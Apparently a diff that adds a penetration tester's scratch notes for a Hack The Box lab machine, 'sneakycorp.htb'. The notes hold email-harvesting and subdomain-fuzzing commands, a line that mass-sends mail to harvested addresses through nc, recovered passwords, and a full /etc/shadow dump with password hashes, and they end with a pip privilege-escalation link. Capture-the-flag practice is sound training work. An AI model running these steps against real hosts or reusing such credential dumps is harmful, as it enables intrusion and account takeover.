@@ -1,0 +1,48 @@
+from nmap we add sneakycorp.htb to hosts
+cewl -d 3 -m 3 -e --email_file emails.txt sneakycorp.htb
+ffuf -w /usr/share/wordlists/wfuzz/general/big.txt -u http://10.10.10.197 -H "Host: FUZZ.sneakycorp.htb" -ac
+cat emails.txt | xargs -I{} -t sh -c "./sendmail.sh {} | nc 10.10.10.197 25"
+developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+pypi:soufianeelhaoui
+
+root:
+05e7c39990d43038093e9274083cf418
+
+hash:
+root:$6$jJW2Iy0Knfw7c6gr$/p2MAEhr7Fy4bMIT8szzgnSkL2kp8EaPKvGQ//cfcX0bMnazYHzNwWIsGaGwgceFyftI2Xihj0rrhUbfkrzhf.:18402:0:99999:7:::
+daemon:*:18396:0:99999:7:::
+bin:*:18396:0:99999:7:::
+sys:*:18396:0:99999:7:::
+sync:*:18396:0:99999:7:::
+games:*:18396:0:99999:7:::
+man:*:18396:0:99999:7:::
+lp:*:18396:0:99999:7:::
+mail:*:18396:0:99999:7:::
+news:*:18396:0:99999:7:::
+uucp:*:18396:0:99999:7:::
+proxy:*:18396:0:99999:7:::
+www-data:*:18396:0:99999:7:::
+backup:*:18396:0:99999:7:::
+list:*:18396:0:99999:7:::
+irc:*:18396:0:99999:7:::
+gnats:*:18396:0:99999:7:::
+nobody:*:18396:0:99999:7:::
+_apt:*:18396:0:99999:7:::
+systemd-timesync:*:18396:0:99999:7:::
+systemd-network:*:18396:0:99999:7:::
+systemd-resolve:*:18396:0:99999:7:::
+messagebus:*:18396:0:99999:7:::
+avahi-autoipd:*:18396:0:99999:7:::
+sshd:*:18396:0:99999:7:::
+low:$6$uJyxhtAXNReh6EXv$usBZZbzaXxYPjjcna4uV2qm7Zcm/tpjYxpKLZFotswl3jxwV9nFr9B8GzO9efkqNrYzuhfOcesiiiD8rZiIyb0:18402:0:99999:7:::
+systemd-coredump:!!:18396::::::
+ftp:*:18396:0:99999:7:::
+postfix:*:18396:0:99999:7:::
+courier:*:18396:0:99999:7:::
+vmail:!:18396::::::
+developer:$6$QwehzS3JhUi8Ms7a$Z3bKmOwCHk6LGgcw6DtuV.Cxr90hfH945xQZrLBsaWCNxmRhFV/GWSDD9eLhpDcOYq4oD5yu6ZbF/KjNb215e.:18397:0:99999:7:::
+pypi:!:18396::::::
+
+
+https://docs.python.org/3.1/distutils/uploading.html
+https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/
